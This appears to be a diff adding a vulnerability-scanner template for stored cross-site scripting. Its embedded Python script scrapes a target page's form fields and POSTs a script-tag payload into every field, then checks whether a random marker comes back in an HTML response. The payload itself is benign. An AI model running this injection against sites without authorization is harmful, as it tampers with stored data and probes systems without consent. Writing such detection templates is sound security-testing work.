@@ -1,0 +1,51 @@
+id: stored-xss-dynamic-injection
+
+info:
+  name: Stored XSS Detection with Dynamic Injection
+  author: pdteam
+  severity: high
+  tags: xss, storedxss, dast
+
+variables:
+  xssProof: "{{rand_int(10000, 99999)}}"
+  OAST: "{{interactsh-url}}"
+
+code:
+  - engine:
+      - py
+      - python3
+    source: |
+      import re
+      import requests
+      import os
+
+      base_url = os.getenv('BaseURL')
+      response = requests.get(base_url)
+      form_fields = re.findall(r'name=["\']?([^"\'>]+)["\']?', response.text)
+
+      # Create payload for each form field
+      xss_payload = f"<script>console.log({os.getenv('xssProof')});</script>"
+      payloads = '&'.join([f"{field}={xss_payload}" for field in form_fields])
+
+      # Printing the payloads to be used in HTTP requests
+      print(payloads)
+
+http:
+  - method: POST
+    path: ["{{BaseURL}}"]
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "{{code_1_response}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xssProof}}"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+# digest: 4a0a0047304502205f911203db8f70565ec8d78a5e2e6633adf35d7d3337f59a803abbb7b56d9a460221008aeec0d3fd15528fbca0ece4cfa66ccb5f9cd1d3955092bb767a3e09aa3acb39:9fdec6057e39e7df17f1062a5f744214
